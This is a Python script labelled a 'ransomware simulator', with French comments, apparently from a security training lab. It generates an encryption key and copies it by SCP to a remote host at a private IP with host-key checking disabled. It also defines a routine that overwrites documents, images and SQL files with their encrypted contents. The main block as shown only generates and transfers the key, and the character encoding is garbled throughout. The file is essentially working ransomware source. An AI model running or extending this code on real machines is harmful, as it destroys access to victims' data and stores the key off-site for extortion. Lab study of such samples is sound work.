#!/usr/bin/env python3
# RANSOMWARE SIMULATEUR - VERSION SSH PUR (SANS SSHPASS)
import os
import sys
import subprocess
from pathlib import Path
from cryptography.fernet import Fernet

# Configuration
SSH_SERVER = "192.168.45.90"
SSH_USER = "doranco"
REMOTE_DIR = "/home/doranco/cle_dechiffrement"
SSH_KEY = "/home/doranco/.ssh/id_ed25519"  # Chemin vers votre cl√© SSH priv√©e

class RansomwareSimulator:
    def __init__(self):
        self.key = None
        self.cipher = None
        self.target_exts = {'.txt', '.doc', '.docx', '.pdf', '.jpg', '.sql'}
        
    def generate_key(self):
        """G√©n√®re une cl√© de chiffrement"""
        print("üîë G√©n√©ration de la cl√©...")
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        print(f"‚úÖ Cl√© g√©n√©r√©e: {self.key.decode()[:12]}...")
        return True

    def transfer_key(self):
        """Transf√®re la cl√© via SCP avec authentification par cl√©"""
        if not self.key:
            print("‚ùå Aucune cl√© g√©n√©r√©e!")
            return False

        try:
            # Cr√©e un fichier temporaire
            key_file = "decryption_key.key"
            with open(key_file, 'wb') as f:
                f.write(self.key)
            
            # 1. Cr√©e le r√©pertoire distant
            subprocess.run([
                'ssh',
                '-i', SSH_KEY,
                f'{SSH_USER}@{SSH_SERVER}',
                f'mkdir -p {REMOTE_DIR}'
            ], check=True)
            
            # 2. Transf√®re la cl√©
            subprocess.run([
                'scp',
                '-i', SSH_KEY,
                '-o', 'StrictHostKeyChecking=no',
                key_file,
                f'{SSH_USER}@{SSH_SERVER}:{REMOTE_DIR}/'
            ], check=True)
            
            # Nettoyage
            os.remove(key_file)
            print(f"üì§ Cl√© transf√©r√©e vers {SSH_SERVER}:{REMOTE_DIR}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"‚ùå √âchec du transfert SSH: {e}")
            return False

    def encrypt_file(self, filepath):
        """Chiffre un fichier"""
        try:
            if Path(filepath).suffix.lower() not in self.target_exts:
                return False

            with open(filepath, 'rb') as f:
                data = f.read()
            
            encrypted = self.cipher.encrypt(data)
            
            with open(filepath, 'wb') as f:
                f.write(encrypted)
            
            return True
        except Exception as e:
            print(f"‚ö†Ô∏è Erreur sur {filepath}: {e}")
            return False

if __name__ == '__main__':
    # V√©rification des pr√©requis
    try:
        subprocess.run(['ssh', '-V'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        subprocess.run(['scp', '-V'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except:
        print("""‚ùå Erreur: OpenSSH doit √™tre install√©
        sudo apt update && sudo apt install -y openssh-client
        """)
        sys.exit(1)

    # Ex√©cution
    sim = RansomwareSimulator()
    if sim.generate_key() and sim.transfer_key():
        print("‚úÖ Op√©ration r√©ussie!")
    else:
        print("‚ùå √âchec de l'op√©ration")
        sys.exit(1)